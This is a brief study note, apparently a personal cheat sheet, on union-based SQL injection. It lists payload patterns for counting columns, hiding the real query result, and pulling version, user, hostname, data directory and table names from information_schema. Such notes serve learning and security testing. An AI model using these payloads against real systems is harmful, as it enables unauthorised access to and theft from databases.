union based SQLi works because Unions disregard datatype and only require the second query to match the first query in col count.

### column enumeration
- select * from table where id=0 union select 1, 1, 1....
- id=0  :no row has id 0 (starts at 1). hides actual query result, only show injection
- union select 1, 1 ... :will error unless col count matches

- select * from table where id=0 union select command()
- command()
	- version() - system version
	- user() - shows current querying user
	- database() - return database name
	- @@hostname - show db hostname
	- @@datadir - show db dir
	- @@version_compile_os - show system os
	- group_concat() - put all returned row into csv

- select from information_schema.tables
- information_schema.tables - show tablenames
	- table_schema - database name